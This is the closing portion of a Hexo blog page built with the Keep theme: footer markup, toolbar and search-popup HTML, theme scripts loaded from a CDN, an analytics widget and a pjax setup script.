src="https://v6-widget.51.la/v6/JiZItHVhLKBShkL0/quote.js?theme=#1690FF,#333333,#999999,#333333,#FFFFFF,#1690FF,18&f=18&display=0,0,1,1,0,1,1,1"></script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/local-search.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/lazyload.js"></script><div class="post-scripts pjax"><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/post-helper.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/toc.js"></script></div><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/pjax.min.js"></script><script>window.addEventListener("DOMContentLoaded",()=>{window.pjax=new Pjax({selectors:["head title",".page-container",".pjax"],history:!0,debug:!1,cacheBust:!1,timeout:0,analytics:!1,currentUrlFullReload:!1,scrollRestoration:!1}),document.addEventListener("pjax:send",()=>{KEEP.utils.pjaxProgressBarStart()}),document.addEventListener("pjax:complete",()=>{KEEP.utils.pjaxProgressBarEnd(),window.pjax.executeScripts(document.querySelectorAll("script[data-pjax], .pjax script")),KEEP.refresh()})})</script></body></html>